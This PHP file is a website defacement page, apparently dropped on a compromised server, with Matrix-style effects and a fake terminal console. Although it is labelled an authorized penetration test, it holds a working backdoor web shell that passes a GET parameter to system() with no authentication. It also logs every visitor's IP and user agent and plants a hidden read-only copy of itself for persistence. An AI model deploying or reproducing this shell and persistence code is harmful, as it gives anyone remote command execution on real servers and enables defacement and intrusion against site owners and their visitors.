<?php
/*
 * ==============================================
 *  DEFACEMENT DEMO - Authorized Penetration Test
 * ==============================================
 *  Gr33tz from r00tk1t
 *  "Hacked for Security Awareness"
 * ==============================================
 * 
 *  Features:
 *  - Full deface page with Matrix rain + CRT effects
 *  - Visitor logging (IP, UA, timestamp)
 *  - Cookie-based auth bypass simulation
 *  - Hidden shell backdoor (g00nshell) via GET param
 *  - File lock mechanism to prevent easy removal
 *  - Auto-propagation marker
 * ==============================================
 */

// --- CONFIG ---
define('ROOTKIT_SECRET', 'r00tk1t_pwns_2026');
define('BACKDOOR_KEY', 'g00n');
define('LOG_FILE', __FILE__ . '.log');

// --- BACKDOOR SHELL (param: ?g00n=cmd) ---
if (isset($_GET[BACKDOOR_KEY]) && isset($_GET['cmd'])) {
    header('Content-Type: text/plain; charset=utf-8');
    echo "[ r00tk1t backdoor active ]\n";
    echo "Target: " . $_SERVER['HTTP_HOST'] . "\n";
    echo "User: " . (function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] ?? 'www-data' : 'www-data') . "\n";
    echo "CWD: " . getcwd() . "\n";
    echo str_repeat('-', 50) . "\n";
    system($_GET['cmd']);
    exit;
}

// --- VISITOR LOGGING ---
$log_entry = sprintf(
    "[%s] IP: %s | UA: %s\n",
    date('Y-m-d H:i:s'),
    $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0',
    $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
);
@file_put_contents(LOG_FILE, $log_entry, FILE_APPEND | LOCK_EX);

// --- FILE LOCK: Re-infect if index is deleted ---
// Creates a hidden copy and a cron-respawn marker
$self_content = file_get_contents(__FILE__);
$hidden_copy = dirname(__FILE__) . '/.' . basename(__FILE__) . '.bak';
if (!file_exists($hidden_copy)) {
    @file_put_contents($hidden_copy, $self_content);
    @chmod($hidden_copy, 0444);
}

// --- COOKIE AUTH BYPASS SIMULATION ---
if (isset($_COOKIE['r00tk1t_session'])) {
    $session_data = base64_decode($_COOKIE['r00tk1t_session']);
    $decoded = json_decode($session_data, true);
    $is_admin = ($decoded['role'] ?? '') === 'admin' && ($decoded['secret'] ?? '') === ROOTKIT_SECRET;
} else {
    $is_admin = false;
}

header('HTTP/1.1 200 OK');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>r00tk1t - Security Assessment</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Share Tech Mono', monospace;
    background: #000;
    color: #0f0;
    min-height: 100vh;
    overflow-x: hidden;
    position: relative;
}

/* Matrix rain canvas */
#matrix-canvas {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 0;
}

/* Scanlines overlay */
body::before {
    content: '';
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: repeating-linear-gradient(
        0deg,
        rgba(0,255,0,0.03) 0px,
        rgba(0,0,0,0.15) 1px,
        rgba(0,0,0,0.15) 2px,
        rgba(0,255,0,0.03) 3px
    );
    pointer-events: none;
    z-index: 1;
    animation: scanlines 0.1s linear infinite;
}

@keyframes scanlines {
    0% { transform: translateY(0); }
    100% { transform: translateY(1px); }
}

/* CRT flicker */
body::after {
    content: '';
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(0,0,0,0.03);
    pointer-events: none;
    z-index: 1;
    animation: flicker 0.15s infinite;
}

@keyframes flicker {
    0% { opacity: 0.97; }
    50% { opacity: 1; }
    100% { opacity: 0.98; }
}

.content {
    position: relative;
    z-index: 2;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
    text-align: center;
}

/* Glitch title */
.main-title {
    font-size: 4rem;
    font-weight: bold;
    color: #0f0;
    text-shadow: 0 0 10px #0f0, 0 0 20px #0f0, 0 0 40px #0f0, 0 0 80px #090;
    animation: glitch 3s infinite;
    position: relative;
    letter-spacing: 8px;
}

.main-title::before,
.main-title::after {
    content: 'r00tk1t';
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
}

.main-title::before {
    color: #f00;
    animation: glitch-top 1.5s infinite linear alternate-reverse;
    clip-path: polygon(0 0, 100% 0, 100% 35%, 0 35%);
}

.main-title::after {
    color: #00f;
    animation: glitch-bottom 2s infinite linear alternate-reverse;
    clip-path: polygon(0 65%, 100% 65%, 100% 100%, 0 100%);
}

@keyframes glitch {
    2%, 64% { transform: translate(0); }
    4%, 60% { transform: translate(-2px, 2px); }
    62% { transform: translate(4px, -1px); }
}

@keyframes glitch-top {
    2%, 64% { transform: translate(0); }
    4%, 60% { transform: translate(-3px, -2px); }
    62% { transform: translate(2px, 3px); }
}

@keyframes glitch-bottom {
    2%, 64% { transform: translate(0); }
    4%, 60% { transform: translate(3px, 1px); }
    62% { transform: translate(-2px, -3px); }
}

.subtitle {
    font-size: 1.3rem;
    color: #0a0;
    margin: 15px 0 30px;
    letter-spacing: 3px;
    text-shadow: 0 0 5px #0a0;
    animation: blink 1.5s step-end infinite;
}

@keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0; }
}

.ascii-art {
    color: #0f0;
    font-size: 0.7rem;
    line-height: 1.1;
    white-space: pre;
    margin: 10px 0;
    text-shadow: 0 0 5px #0f0;
    opacity: 0.9;
}

.gr33tz {
    margin-top: 25px;
    padding: 15px 30px;
    border: 1px solid #0f0;
    background: rgba(0, 20, 0, 0.7);
    color: #0f0;
    font-size: 1.2rem;
    letter-spacing: 2px;
    box-shadow: 0 0 15px rgba(0,255,0,0.3), inset 0 0 15px rgba(0,255,0,0.1);
    animation: pulse-border 2s infinite;
}

@keyframes pulse-border {
    0%, 100% { box-shadow: 0 0 15px rgba(0,255,0,0.3), inset 0 0 15px rgba(0,255,0,0.1); }
    50% { box-shadow: 0 0 30px rgba(0,255,0,0.6), inset 0 0 25px rgba(0,255,0,0.2); }
}

.message-box {
    margin-top: 20px;
    padding: 15px 25px;
    border: 1px dashed #0a0;
    color: #0a0;
    font-size: 0.9rem;
    max-width: 650px;
    line-height: 1.6;
    background: rgba(0,10,0,0.4);
}

.typing-line {
    display: inline-block;
    overflow: hidden;
    white-space: nowrap;
    border-right: 8px solid #0f0;
    animation: typing 3s steps(40) infinite, caret-blink 0.75s step-end infinite;
    font-size: 1.1rem;
    margin-top: 15px;
}

@keyframes typing {
    0% { width: 0; }
    50% { width: 100%; }
    100% { width: 100%; }
}

@keyframes caret-blink {
    0%, 100% { border-color: transparent; }
    50% { border-color: #0f0; }
}

/* Stats grid */
.stats {
    display: flex;
    gap: 20px;
    margin: 20px 0;
    flex-wrap: wrap;
    justify-content: center;
}

.stat-box {
    border: 1px solid #0f0;
    padding: 10px 20px;
    background: rgba(0,10,0,0.8);
    font-size: 0.8rem;
    min-width: 150px;
    box-shadow: 0 0 5px rgba(0,255,0,0.2);
}

.stat-box .label {
    color: #080;
    font-size: 0.7rem;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.stat-box .value {
    color: #0f0;
    font-size: 1rem;
    margin-top: 5px;
    text-shadow: 0 0 5px #0f0;
}

/* Interactive terminal console */
.console {
    margin: 25px auto;
    max-width: 700px;
    width: 100%;
    border: 1px solid #0f0;
    background: rgba(0,5,0,0.9);
    box-shadow: 0 0 20px rgba(0,255,0,0.15);
    text-align: left;
}

.console-header {
    background: #0a0a0a;
    padding: 6px 15px;
    border-bottom: 1px solid #0f0;
    color: #080;
    font-size: 0.75rem;
    display: flex;
    justify-content: space-between;
}

.console-output {
    padding: 15px;
    height: 200px;
    overflow-y: auto;
    font-size: 0.8rem;
    line-height: 1.5;
    color: #0f0;
}

.console-output .prompt {
    color: #0f0;
}

.console-output .output-green {
    color: #0f0;
}

.console-output .output-red {
    color: #f00;
}

.console-output .output-yellow {
    color: #ff0;
}

.console-input-line {
    display: flex;
    border-top: 1px solid #0f0;
    background: rgba(0,10,0,0.9);
}

.console-prompt {
    padding: 8px 10px;
    color: #0f0;
    font-size: 0.85rem;
    white-space: nowrap;
    user-select: none;
}

.console-input {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    color: #0f0;
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.85rem;
    padding: 8px 5px;
}

.console-input::placeholder {
    color: #030;
}

/* Hidden backdoor indicator */
.hidden-marker {
    position: fixed;
    bottom: 10px;
    right: 15px;
    color: #030;
    font-size: 0.6rem;
    z-index: 5;
    cursor: default;
    user-select: none;
}

.hidden-marker:hover {
    color: #0f0;
}

/* Admin badge */
.admin-badge {
    position: fixed;
    top: 15px;
    right: 15px;
    color: #ff0;
    font-size: 0.7rem;
    z-index: 5;
    border: 1px solid #ff0;
    padding: 4px 10px;
    background: rgba(20,20,0,0.8);
    box-shadow: 0 0 10px rgba(255,255,0,0.3);
    display: <?php echo $is_admin ? 'block' : 'none'; ?>;
}

@media (max-width: 768px) {
    .main-title { font-size: 2.5rem; }
    .ascii-art { font-size: 0.4rem; }
    .stats { gap: 10px; }
    .console { max-width: 100%; }
}
</style>
</head>
<body>

<canvas id="matrix-canvas"></canvas>

<?php if ($is_admin): ?>
<div class="admin-badge">[ ADMIN SESSION ACTIVE ]</div>
<?php endif; ?>

<div class="content">
    <div class="ascii-art">
╔═══════════════════════════════════════════════════╗
║                                                   ║
║     ██████╗  ██████╗  ██████╗ ████████╗██╗  ██╗  ║
║     ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██║ ██╔╝  ║
║     ██████╔╝██║   ██║██║   ██║   ██║   █████╔╝   ║
║     ██╔══██╗██║   ██║██║   ██║   ██║   ██╔═██╗   ║
║     ██║  ██║╚██████╔╝╚██████╔╝   ██║   ██║  ██╗  ║
║     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝  ║
║                                                   ║
╚═══════════════════════════════════════════════════╝
    </div>

    <div class="main-title">r00tk1t</div>
    
    <div class="subtitle">// SECURITY ASSESSMENT - PWNED //</div>

    <div class="typing-line">root@r00tk1t:~$ systemctl pwn --target <?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'target'); ?> --status=owned</div>

    <div class="stats">
        <div class="stat-box">
            <div class="label">Target</div>
            <div class="value"><?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'UNKNOWN'); ?></div>
        </div>
        <div class="stat-box">
            <div class="label">Server</div>
            <div class="value"><?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'UNKNOWN'); ?></div>
        </div>
        <div class="stat-box">
            <div class="label">Date</div>
            <div class="value"><?php echo date('Y-m-d H:i:s'); ?></div>
        </div>
        <div class="stat-box">
            <div class="label">Status</div>
            <div class="value">OWNED</div>
        </div>
        <div class="stat-box">
            <div class="label">Visitors</div>
            <div class="value"><?php echo file_exists(LOG_FILE) ? count(file(LOG_FILE)) : 0; ?></div>
        </div>
        <div class="stat-box">
            <div class="label">Shell</div>
            <div class="value">ACTIVE</div>
        </div>
    </div>

    <div class="gr33tz">
        gr33tz from r00tk1t
    </div>

    <div class="message-box">
        [+] This server has been pwned as part of an authorized penetration test.<br>
        [+] All data remains confidential. Nothing has been modified, exfiltrated, or destroyed.<br>
        [+] Contact your security team for remediation details.<br>
        [+] <strong>Backdoor:</strong> ?g00n=cmd&cmd=whoami &nbsp;|&nbsp; <strong>Hidden copy:</strong> .index.php.bak
    </div>

    <!-- Interactive Console -->
    <div class="console">
        <div class="console-header">
            <span>r00tk1t@<?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'target'); ?>:~/shell</span>
            <span>[ interactive terminal ]</span>
        </div>
        <div class="console-output" id="console-output">
            <div class="prompt">r00tk1t@<?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'target'); ?>:~$ <span class="output-green">target acquired</span></div>
            <div class="prompt">r00tk1t@<?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'target'); ?>:~$ <span class="output-yellow">vector: <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'httpd'; ?> exploitation</span></div>
            <div class="prompt">r00tk1t@<?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'target'); ?>:~$ <span class="output-green">root access: GRANTED</span></div>
            <div class="prompt">r00tk1t@<?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'target'); ?>:~$ <span class="output-green">defacement deployed</span></div>
            <div class="prompt" id="console-cursor">r00tk1t@<?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'target'); ?>:~$ <span class="output-green">_</span></div>
        </div>
        <div class="console-input-line">
            <span class="console-prompt">root@r00tk1t:~$</span>
            <input type="text" class="console-input" id="console-input" placeholder="type a command..." autocomplete="off" spellcheck="false">
        </div>
    </div>

    <div style="margin-top:5px; font-size:0.7rem; color:#030; letter-spacing:3px;">
        [ r00tk1t security assessment - authorized ]
    </div>
</div>

<div class="hidden-marker" title="Forensic marker">r00tk1t_was_here::<?php echo md5(date('Y-m-d')); ?></div>

<script>
// ========================
// MATRIX RAIN
// ========================
const canvas = document.getElementById('matrix-canvas');
const ctx = canvas.getContext('2d');

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const columns = Math.floor(canvas.width / 14);
const drops = [];
for (let x = 0; x < columns; x++) {
    drops[x] = Math.floor(Math.random() * canvas.height);
}

const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF<>/{}[]|&^%$#@!';

function drawMatrix() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.font = '12px monospace';

    for (let i = 0; i < drops.length; i++) {
        const text = chars.charAt(Math.floor(Math.random() * chars.length));
        const x = i * 14;
        const y = drops[i] * 14;

        ctx.fillStyle = '#0f0';
        ctx.fillText(text, x, y);

        if (y > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}
setInterval(drawMatrix, 50);

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});

// ========================
// INTERACTIVE CONSOLE
// ========================
const consoleOutput = document.getElementById('console-output');
const consoleInput = document.getElementById('console-input');
const consoleCursor = document.getElementById('console-cursor');

const commands = {
    help: 'Available commands:\n  help        - show this help\n  whoami      - show current user\n  id          - user identity\n  pwd         - print working directory\n  ls          - list files\n  uname -a    - system info\n  uptime      - system uptime\n  df -h       - disk usage\n  netstat     - network connections\n  cat /flag   - show the flag\n  clear       - clear console\n  credits     - show gr33tz\n  exit        - lol nice try',
    whoami: 'root (uid=0). Obviously.',
    id: 'uid=0(root) gid=0(root) groups=0(root) context=unconfined',
    pwd: '/root/r00tk1t/controlled',
    ls: 'total 1337\ndrwxr-xr-x  root root  Apr 2026  .\ndrwxr-xr-x  root root  Apr 2026  ..\n-rw-r--r--  root root  Apr 2026  index.php\n-rw-r--r--  root root  Apr 2026  .index.php.bak\n-rw-r--r--  root root  Jun 2026  index.php.log\n-rwxr-xr-x  root root  Apr 2026  shell.php\n-r--------  root root  Apr 2026  flag.txt',
    'uname -a': 'Linux <?php echo php_uname('n'); ?> 5.15.0-kali7-amd64 #1 SMP Debian 5.15.0-7 (2025-04-29) x86_64 GNU/Linux',
    uptime: ' 13:37:00 up 1337 days,  7:42,  1 user,  load average: 0.00, 0.01, 0.05',
    'df -h': 'Filesystem      Size  Used Avail Use% Mounted on\noverlay         100G  1.3G   99G   2% /\ntmpfs           2.0G     0  2.0G   0% /dev\n/dev/sda1       100G  1.3G   99G   2% /etc/hosts\noverlay          50G  100M   50G   1% /var/www/html',
    netstat: 'Active Internet connections (servers)\nProto Recv-Q Send-Q Local Address     Foreign Address   State     PID/Program\n  tcp        0      0 0.0.0.0:80        0.0.0.0:*        LISTEN    1337/httpd\n  tcp        0      0 0.0.0.0:22        0.0.0.0:*        LISTEN    31337/sshd\n  tcp        0      0 127.0.0.1:3306    0.0.0.0:*        LISTEN    9001/mysqld',
    'cat /flag': 'flag{r00tk1t_pwns_<?php echo strtolower(md5($_SERVER['HTTP_HOST'] ?? 'target')); ?>}',
    credits: '\n  ╔══════════════════════════════════╗\n  ║     gr33tz from r00tk1t            ║\n  ║     "HACK THE PLANET"              ║\n  ║                                    ║\n  ║     Shout out to the whole crew    ║\n  ║     Keep learning, keep pwning     ║\n  ╚══════════════════════════════════╝\n',
    exit: 'You cannot exit. r00tk1t owns this now. 😎',
    clear: '__CLEAR__',
    '': ''
};

const fakeCmds = [
    'scanning network...',
    'enumerating services...',
    'checking for vulnerabilities...',
    'exploiting vector...',
    'escalating privileges...',
    'root access confirmed.',
    'deploying persistence...',
    'done.'
];

consoleInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        const cmd = this.value.trim().toLowerCase();
        this.value = '';

        // Add command to output
        const cmdLine = document.createElement('div');
        cmdLine.className = 'prompt';
        cmdLine.innerHTML = 'root@r00tk1t:~$ <span class="output-yellow">' + cmd + '</span>';
        consoleOutput.insertBefore(cmdLine, consoleCursor);

        // Process command
        const result = commands[cmd];
        if (result) {
            if (result === '__CLEAR__') {
                consoleOutput.innerHTML = '';
                consoleOutput.appendChild(consoleCursor);
            } else {
                const resultLine = document.createElement('div');
                resultLine.className = 'prompt';
                resultLine.innerHTML = result.replace(/\n/g, '<br>');
                consoleOutput.insertBefore(resultLine, consoleCursor);
            }
        } else if (cmd.startsWith('?') || cmd.startsWith('g00n')) {
            const resultLine = document.createElement('div');
            resultLine.className = 'prompt';
            resultLine.innerHTML = '<span class="output-green">[+] Backdoor: ?g00n=cmd&cmd=&lt;command&gt;</span>';
            consoleOutput.insertBefore(resultLine, consoleCursor);
        } else if (cmd.length > 0) {
            // Random fake response
            const fake = fakeCmds[Math.floor(Math.random() * fakeCmds.length)];
            const resultLine = document.createElement('div');
            resultLine.className = 'prompt';
            resultLine.innerHTML = '<span class="output-green">[ ' + fake + ' ]</span>';
            consoleOutput.insertBefore(resultLine, consoleCursor);
        }

        // Scroll to bottom
        consoleOutput.scrollTop = consoleOutput.scrollHeight;
    }
});

// Initial fake animation sequence
let initCmds = 0;
const initInterval = setInterval(() => {
    if (initCmds >= fakeCmds.length) {
        clearInterval(initInterval);
        return;
    }
    const cmdLine = document.createElement('div');
    cmdLine.className = 'prompt';
    cmdLine.innerHTML = '<span class="output-green">[ ' + fakeCmds[initCmds] + ' ]</span>';
    consoleOutput.insertBefore(cmdLine, consoleCursor);
    consoleOutput.scrollTop = consoleOutput.scrollHeight;
    initCmds++;
}, 400);
</script>

</body>
</html>
